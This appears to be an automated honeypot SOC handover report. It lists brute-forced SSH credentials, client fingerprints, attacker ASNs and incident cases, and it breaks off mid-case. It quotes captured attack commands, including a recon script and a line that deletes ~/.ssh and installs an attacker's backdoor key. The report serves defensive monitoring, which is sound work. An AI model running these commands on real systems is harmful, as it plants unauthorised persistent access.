# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-27 |
| **Generated At** | 2026-07-27T11:29:32Z |
| **Shift Time** | 11:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **279** |
| Confirmed Threats | **250** |
| False Positives Filtered | **29** (10.4%) |
| Unique Attacker IPs | **147** |
| Countries of Origin | **39** |
| High Severity Cases | **127** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **152** |
| Malware Samples Analyzed | **3** HIGH · **30** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **202** |
| Unique Credential Pairs | **98** |
| Unique Usernames | **19** |
| Unique Passwords | **84** |
| Successful Auth Pairs | **168** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 88 |
| `guest` | 22 |
| `config` | 12 |
| `admin` | 12 |
| `pi` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `0` | 10 |
| `444444` | 9 |
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `ubuntu` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `unknown` | `0` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `guest` | `guest333` | 6 |
| `guest` | `1111` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123` | `80.94.92.55` | 2026-07-27T06:55:29 |
| `root` | `123123` | `80.94.92.55` | 2026-07-27T06:58:22 |
| `guest` | `444444` | `60.251.229.144` | 2026-07-27T07:01:00 |
| `root` | `1234` | `80.94.92.55` | 2026-07-27T07:01:31 |
| `support` | `support` | `176.53.159.196` | 2026-07-27T07:01:41 |
| `guest` | `444444` | `111.70.23.240` | 2026-07-27T07:04:13 |
| `guest` | `444444` | `60.175.91.53` | 2026-07-27T07:04:23 |
| `root` | `12345` | `80.94.92.55` | 2026-07-27T07:04:41 |
| `guest` | `444444` | `10.0.0.73` | 2026-07-27T07:04:41 |
| `pi` | `123123` | `178.178.222.58` | 2026-07-27T07:04:43 |
| `pi` | `123123` | `10.0.0.73` | 2026-07-27T07:05:20 |
| `unknown` | `0` | `93.62.72.229` | 2026-07-27T07:07:58 |
| `unknown` | `0` | `221.182.185.190` | 2026-07-27T07:08:10 |
| `root` | `12345678` | `80.94.92.55` | 2026-07-27T07:10:56 |
| `unknown` | `0` | `65.20.134.97` | 2026-07-27T07:11:24 |
| `unknown` | `0` | `118.122.196.230` | 2026-07-27T07:11:38 |
| `unknown` | `0` | `10.0.0.73` | 2026-07-27T07:11:43 |
| `root` | `123456789` | `80.94.92.55` | 2026-07-27T07:13:38 |
| `root` | `000000` | `80.94.92.55` | 2026-07-27T07:17:46 |
| `root` | `111111` | `80.94.92.55` | 2026-07-27T07:20:41 |
| `config` | `0` | `65.20.237.119` | 2026-07-27T07:25:19 |
| `config` | `0` | `217.150.37.249` | 2026-07-27T07:25:26 |
| `root` | `password1` | `139.255.254.163` | 2026-07-27T07:25:34 |
| `345gs5662d34` | `345gs5662d34` | `139.255.254.163` | 2026-07-27T07:25:38 |
| `root` | `3245gs5662d34` | `139.255.254.163` | 2026-07-27T07:25:40 |
| `guest` | `guest333` | `222.236.155.146` | 2026-07-27T07:25:51 |
| `guest` | `guest333` | `112.94.5.43` | 2026-07-27T07:26:01 |
| `support` | `support` | `10.0.0.73` | 2026-07-27T07:27:21 |
| `testuser` | `123123` | `185.150.190.130` | 2026-07-27T07:27:55 |
| `345gs5662d34` | `345gs5662d34` | `185.150.190.130` | 2026-07-27T07:27:56 |
| `testuser` | `3245gs5662d34` | `185.150.190.130` | 2026-07-27T07:27:56 |
| `guest` | `guest333` | `85.195.9.20` | 2026-07-27T07:29:08 |
| `config` | `0` | `10.0.0.73` | 2026-07-27T07:29:10 |
| `guest` | `guest333` | `202.72.196.75` | 2026-07-27T07:29:16 |
| `guest` | `guest333` | `10.0.0.73` | 2026-07-27T07:29:37 |
| `blank` | `555` | `10.0.0.73` | 2026-07-27T07:36:27 |
| `root` | `1q2w3e4r` | `80.94.92.55` | 2026-07-27T07:45:02 |
| `root` | `654321` | `80.94.92.55` | 2026-07-27T07:47:56 |
| `centos` | `2222` | `65.20.161.126` | 2026-07-27T07:49:53 |
| `centos` | `2222` | `60.174.35.18` | 2026-07-27T07:50:03 |
| `root` | `8` | `81.237.155.113` | 2026-07-27T07:50:20 |
| `root` | `P@ssw0rd` | `80.94.92.55` | 2026-07-27T07:50:48 |
| `root` | `` | `94.154.43.158` | 2026-07-27T07:51:48 |
| `centos` | `2222` | `91.144.158.62` | 2026-07-27T07:53:18 |
| `root` | `admin` | `80.94.92.55` | 2026-07-27T07:53:35 |
| `centos` | `2222` | `10.0.0.73` | 2026-07-27T07:53:42 |
| `root` | `8` | `10.0.0.73` | 2026-07-27T07:54:11 |
| `root` | `admin123` | `80.94.92.55` | 2026-07-27T07:56:17 |
| `root` | `passw0rd` | `80.94.92.55` | 2026-07-27T07:58:56 |
| `default` | `5555555` | `181.212.174.166` | 2026-07-27T08:00:18 |
| `default` | `5555555` | `116.48.143.166` | 2026-07-27T08:00:28 |
| `default` | `5555555` | `10.0.0.73` | 2026-07-27T08:00:43 |
| `root` | `password` | `80.94.92.55` | 2026-07-27T08:01:31 |
| `root` | `password1` | `80.94.92.55` | 2026-07-27T08:04:13 |
| `root` | `qwerty` | `80.94.92.55` | 2026-07-27T08:06:54 |
| `root` | `root123` | `80.94.92.55` | 2026-07-27T08:09:38 |
| `root` | `toor` | `80.94.92.55` | 2026-07-27T08:12:17 |
| `blank` | `0000000` | `112.161.26.125` | 2026-07-27T08:14:08 |
| `blank` | `0000000` | `123.129.245.249` | 2026-07-27T08:14:20 |
| `admin` | `000000` | `80.94.92.55` | 2026-07-27T08:15:01 |
| `admin` | `111111` | `80.94.92.55` | 2026-07-27T08:17:27 |
| `config` | `11111` | `116.72.9.151` | 2026-07-27T08:18:15 |
| `admin` | `123` | `80.94.92.55` | 2026-07-27T08:19:48 |
| `guest` | `1111111` | `213.130.207.177` | 2026-07-27T08:24:56 |
| `guest` | `1111111` | `10.0.0.73` | 2026-07-27T08:25:15 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-27T08:37:17 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-27T08:37:17 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-27T08:37:26 |
| `pi` | `qwerty1234` | `58.56.128.190` | 2026-07-27T08:38:40 |
| `pi` | `qwerty1234` | `111.70.32.10` | 2026-07-27T08:38:49 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-27T08:42:16 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-27T08:42:16 |
| `pi` | `qwerty1234` | `10.0.0.73` | 2026-07-27T08:42:28 |
| `guest` | `333333` | `10.0.0.73` | 2026-07-27T08:43:17 |
| `igor` | `1` | `5.253.38.188` | 2026-07-27T08:44:11 |
| `345gs5662d34` | `345gs5662d34` | `5.253.38.188` | 2026-07-27T08:44:13 |
| `igor` | `3245gs5662d34` | `5.253.38.188` | 2026-07-27T08:44:14 |
| `root` | `wP7AsS2l3s` | `10.0.0.73` | 2026-07-27T08:47:15 |
| `config` | `7` | `10.0.0.73` | 2026-07-27T08:49:44 |
| `administrator` | `Password` | `58.34.174.90` | 2026-07-27T09:03:19 |
| `ubnt` | `444444` | `27.223.98.117` | 2026-07-27T09:04:07 |
| `ubnt` | `444444` | `196.189.126.185` | 2026-07-27T09:04:15 |
| `administrator` | `Password` | `210.177.143.61` | 2026-07-27T09:06:30 |
| `administrator` | `Password` | `113.11.34.221` | 2026-07-27T09:06:44 |
| `administrator` | `Password` | `10.0.0.73` | 2026-07-27T09:06:53 |
| `ubnt` | `444444` | `10.0.0.73` | 2026-07-27T09:07:41 |
| `default` | `default111` | `203.192.211.180` | 2026-07-27T09:13:53 |
| `default` | `default111` | `10.0.0.73` | 2026-07-27T09:14:21 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-27T09:14:52 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-27T09:15:08 |
| `root` | `111111` | `80.94.92.234` | 2026-07-27T09:22:38 |
| `Operator` | `ubuntu` | `115.241.228.34` | 2026-07-27T09:27:33 |
| `root` | `Local123` | `10.0.0.73` | 2026-07-27T09:27:42 |
| `root` | `ssh-probe-BBCC54CFEA69926A20A727B66CC11C3457FDF4F4C917DE3C` | `10.0.0.73` | 2026-07-27T09:27:42 |
| `config` | `config555` | `218.149.235.152` | 2026-07-27T09:28:27 |
| `config` | `config555` | `196.188.187.85` | 2026-07-27T09:28:39 |
| `Operator` | `ubuntu` | `87.103.126.54` | 2026-07-27T09:30:59 |
| `Operator` | `ubuntu` | `190.223.36.108` | 2026-07-27T09:31:06 |
| `config` | `config555` | `218.21.250.151` | 2026-07-27T09:31:49 |
| `config` | `config555` | `10.0.0.73` | 2026-07-27T09:32:13 |
| `root` | `Ff123456` | `10.0.0.73` | 2026-07-27T09:33:49 |
| `root` | `ssh-probe-C4A46E8BC1ADF6DA5E57CDD5E0AE4B4E5B950B16331CE852` | `10.0.0.73` | 2026-07-27T09:33:49 |
| `root` | `9999` | `60.251.229.144` | 2026-07-27T09:35:06 |
| `root` | `9999` | `24.187.213.29` | 2026-07-27T09:38:14 |
| `root` | `4dm1n1234567!` | `10.0.0.73` | 2026-07-27T09:39:59 |
| `root` | `ssh-probe-42A4298F0B6089A776C9055BB866C95041E5CA9C0FD6AF3D` | `10.0.0.73` | 2026-07-27T09:39:59 |
| `root` | `P@s$word@12345` | `10.0.0.73` | 2026-07-27T09:46:16 |
| `root` | `ssh-probe-9C5412332284B04C8A70FA36C16FB3461BDD0FC0371B934B` | `10.0.0.73` | 2026-07-27T09:46:17 |
| `root` | `12345678` | `10.0.0.73` | 2026-07-27T09:48:22 |
| `root` | `QwEr!2#4` | `217.156.66.34` | 2026-07-27T09:48:26 |
| `345gs5662d34` | `345gs5662d34` | `217.156.66.34` | 2026-07-27T09:48:29 |
| `root` | `3245gs5662d34` | `217.156.66.34` | 2026-07-27T09:48:30 |
| `root` | `India123` | `10.0.0.73` | 2026-07-27T09:52:13 |
| `root` | `ssh-probe-6BB64C83323701FCE6CE6277C1608E6CC3037383947D9573` | `10.0.0.73` | 2026-07-27T09:52:14 |
| `user` | `7777777` | `10.0.0.73` | 2026-07-27T09:55:44 |
| `root` | `!QA@WS3ed` | `46.101.216.224` | 2026-07-27T09:58:09 |
| `345gs5662d34` | `345gs5662d34` | `46.101.216.224` | 2026-07-27T09:58:11 |
| `root` | `3245gs5662d34` | `46.101.216.224` | 2026-07-27T09:58:12 |
| `guest` | `1111` | `62.183.82.70` | 2026-07-27T09:59:26 |
| `root` | `qwertyuiop@123` | `10.0.0.73` | 2026-07-27T10:02:03 |
| `root` | `ssh-probe-A6C39920450C1FBE367183245C556181D56E8F565A885235` | `10.0.0.73` | 2026-07-27T10:02:05 |
| `guest` | `1111` | `112.26.99.93` | 2026-07-27T10:02:56 |
| `guest` | `1111` | `50.217.40.11` | 2026-07-27T10:03:06 |
| `guest` | `1111` | `10.0.0.73` | 2026-07-27T10:03:20 |
| `root` | `qweasdzxc123!@#` | `163.7.9.55` | 2026-07-27T10:03:43 |
| `345gs5662d34` | `345gs5662d34` | `163.7.9.55` | 2026-07-27T10:03:48 |
| `root` | `3245gs5662d34` | `163.7.9.55` | 2026-07-27T10:03:49 |
| `root` | `Zr123456@` | `217.160.194.89` | 2026-07-27T10:04:09 |
| `345gs5662d34` | `345gs5662d34` | `217.160.194.89` | 2026-07-27T10:04:12 |
| `root` | `3245gs5662d34` | `217.160.194.89` | 2026-07-27T10:04:12 |
| `root` | `qw12QW!@` | `103.176.107.136` | 2026-07-27T10:04:25 |
| `345gs5662d34` | `345gs5662d34` | `103.176.107.136` | 2026-07-27T10:04:30 |
| `root` | `3245gs5662d34` | `103.176.107.136` | 2026-07-27T10:04:32 |
| `root` | `Lm123456` | `10.0.0.73` | 2026-07-27T10:10:41 |
| `root` | `ssh-probe-8F295A226DC01C8DFB84296471138AD6ED3E8AE077E771D1` | `10.0.0.73` | 2026-07-27T10:10:42 |
| `pi` | `passw0rd` | `103.174.34.49` | 2026-07-27T10:16:29 |
| `postgres` | `ubuntu` | `111.171.125.94` | 2026-07-27T10:17:18 |
| `pi` | `passw0rd` | `218.206.136.24` | 2026-07-27T10:19:51 |
| `pi` | `passw0rd` | `190.12.109.162` | 2026-07-27T10:19:59 |
| `root` | `---fuck_you----` | `43.100.93.96` | 2026-07-27T10:20:16 |
| `postgres` | `ubuntu` | `219.129.96.2` | 2026-07-27T10:20:47 |
| `postgres` | `ubuntu` | `117.222.52.215` | 2026-07-27T10:20:57 |
| `postgres` | `ubuntu` | `10.0.0.73` | 2026-07-27T10:21:08 |
| `root` | `777777` | `182.75.227.178` | 2026-07-27T10:24:02 |
| `root` | `777777` | `191.210.73.33` | 2026-07-27T10:24:10 |
| `root` | `test!123456` | `10.0.0.73` | 2026-07-27T10:27:52 |
| `root` | `ssh-probe-DFC0747D92AB33493481C4022DD06347D0772E7FC8C699EE` | `10.0.0.73` | 2026-07-27T10:27:53 |
| `admin` | `admin` | `118.26.111.107` | 2026-07-27T10:31:41 |
| `root` | `Xs123456` | `10.0.0.73` | 2026-07-27T10:32:06 |
| `root` | `ssh-probe-7BE979F207D88DF15144E1F03BFAAF91AE6C799BF1820B76` | `10.0.0.73` | 2026-07-27T10:32:07 |
| `root` | `Admin123123` | `10.0.0.73` | 2026-07-27T10:36:20 |
| `root` | `ssh-probe-6514FC4B7926E7A12FDBC76CCAD7FC0BCB024D2CA8C1C679` | `10.0.0.73` | 2026-07-27T10:36:21 |
| `root` | `Password99` | `10.0.0.73` | 2026-07-27T10:40:35 |
| `root` | `ssh-probe-AA43BB1AF3399B69FEADC950759CD9C149AE1957C73D808D` | `10.0.0.73` | 2026-07-27T10:40:36 |
| `nobody` | `0000000` | `112.161.26.125` | 2026-07-27T10:41:45 |
| `nobody` | `0000000` | `196.188.187.85` | 2026-07-27T10:41:53 |
| `nobody` | `nobody66` | `10.0.0.73` | 2026-07-27T10:44:33 |
| `root` | `admin123` | `10.0.0.73` | 2026-07-27T10:44:57 |
| `root` | `ssh-probe-F3E76DEAA95347A6E7C0478890322F5A33AF6F5667B9E707` | `10.0.0.73` | 2026-07-27T10:44:58 |
| `nobody` | `0000000` | `50.188.204.213` | 2026-07-27T10:45:15 |
| `admin` | `8` | `182.156.35.238` | 2026-07-27T10:48:32 |
| `root` | `qwert123` | `10.0.0.73` | 2026-07-27T10:49:13 |
| `root` | `ssh-probe-E54F228365DA070BD7717A8636715D2750B7A0500961662E` | `10.0.0.73` | 2026-07-27T10:49:14 |
| `admin` | `8` | `58.57.154.146` | 2026-07-27T10:52:04 |
| `admin` | `8` | `65.20.141.202` | 2026-07-27T10:52:17 |
| `admin` | `8` | `10.0.0.73` | 2026-07-27T10:52:20 |
| `root` | `password123$` | `10.0.0.73` | 2026-07-27T10:53:41 |
| `root` | `ssh-probe-3CEE46DA71C140C8497F403A746515C55DE228CE9EC05BA8` | `10.0.0.73` | 2026-07-27T10:53:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **279** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 63 |
| Go SSH scanner | 48 |
| libssh | 39 |
| Paramiko (Python) | 10 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 58 | 54 |
| `2ec37a7cc8da...` | Mirai/variant | 31 | 2 |
| `f555226df196...` | Mirai/variant | 25 | 9 |
| `a2de0f306611...` | Mirai/variant | 10 | 2 |
| `0a07365cc01f...` | Generic scanner | 9 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 58 | 54 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 31 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 25 | 9 | Mirai/variant |
| `95420f9d932d...` | libssh | 14 | 6 | — |
| `a2de0f306611...` | Paramiko (Python) | 10 | 2 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 9 | 1 | Generic scanner |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `5bd26477da54...` | PuTTY | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 29 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.234`, `80.94.92.55`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.158`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `217.156.66.34`, `139.255.254.163`, `46.101.216.224`, `163.7.9.55`, `217.160.194.89`, `103.176.107.136`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **147** |
| Unique ASNs | **100** |
| High-Risk ASNs | **82** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS48721` | Flyservers S.A. | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (127)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5fdaba9fb7fd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 06:55 |
| **Last Seen** | 2026-07-27 06:55 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 06:55:12` | `cowrie.session.connect` |
| `2026-07-27 06:55:14` | `cowrie.client.version` |
| `2026-07-27 06:55:14` | `cowrie.client.kex` |
| `2026-07-27 06:55:29` | `cowrie.login.success` |
| `2026-07-27 06:55:34` | `cowrie.session.params` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:34` | `cowrie.command.success` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:34` | `cowrie.command.input` |
| `2026-07-27 06:55:36` | `cowrie.log.closed` |
| `2026-07-27 06:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-895d330fc42a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 06:58 |
| **Last Seen** | 2026-07-27 06:58 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 06:58:01` | `cowrie.session.connect` |
| `2026-07-27 06:58:04` | `cowrie.client.version` |
| `2026-07-27 06:58:04` | `cowrie.client.kex` |
| `2026-07-27 06:58:22` | `cowrie.login.success` |
| `2026-07-27 06:58:28` | `cowrie.session.params` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:28` | `cowrie.command.success` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:28` | `cowrie.command.input` |
| `2026-07-27 06:58:32` | `cowrie.log.closed` |
| `2026-07-27 06:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1bee4e2fd80

| Field | Detail |
|---|---|
| **Source IP** | `60.251.229[.]144` |
| **First Seen** | 2026-07-27 07:00 |
| **Last Seen** | 2026-07-27 07:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:00:58` | `cowrie.session.connect` |
| `2026-07-27 07:00:59` | `cowrie.client.version` |
| `2026-07-27 07:00:59` | `cowrie.client.kex` |
| `2026-07-27 07:01:00` | `cowrie.login.success` |
| `2026-07-27 07:01:01` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.251.229[.]144` to AbuseIPDB if not already reported
- [ ] Block `60.251.229[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0418a52ab795

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:01 |
| **Last Seen** | 2026-07-27 07:01 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:01:14` | `cowrie.session.connect` |
| `2026-07-27 07:01:17` | `cowrie.client.version` |
| `2026-07-27 07:01:17` | `cowrie.client.kex` |
| `2026-07-27 07:01:31` | `cowrie.login.success` |
| `2026-07-27 07:01:39` | `cowrie.session.params` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:39` | `cowrie.command.success` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:39` | `cowrie.command.input` |
| `2026-07-27 07:01:43` | `cowrie.log.closed` |
| `2026-07-27 07:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e01b6137a8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-27 07:01 |
| **Last Seen** | 2026-07-27 07:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
